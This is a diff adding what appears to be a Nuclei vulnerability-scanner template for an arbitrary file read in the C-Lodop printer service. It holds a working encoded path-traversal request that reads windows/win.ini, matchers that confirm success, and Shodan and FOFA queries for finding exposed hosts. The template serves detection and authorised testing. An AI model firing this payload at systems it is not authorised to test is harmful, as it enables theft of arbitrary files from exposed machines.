@@ -1,0 +1,40 @@
+id: clodop-printer-lfi
+
+info:
+  name: C-Lodop Printer - Arbitrary File Read
+  author: xc
+  severity: high
+  description: |
+    The C-Lodop printer has an arbitrary file reading vulnerability. By constructing a special URL, it can read any file in the system.
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"Welcome to C-Lodop"
+    fofa-query: title="C-Lodop"
+  tags: c-lodop,lfi,printer,iot
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+
+      - type: status
+        status:
+          - 200
+
+# digest: 490a0046304402200d449e4275597227daa8a44a52c46a9f5f9ca529c06abad7d9dd8381b1f1a2880220286189ff2ccadb8505d03656c04b6e047397a66911154fd84f60e1a65910276a:922c64590222798bb761d5b6d8e72950
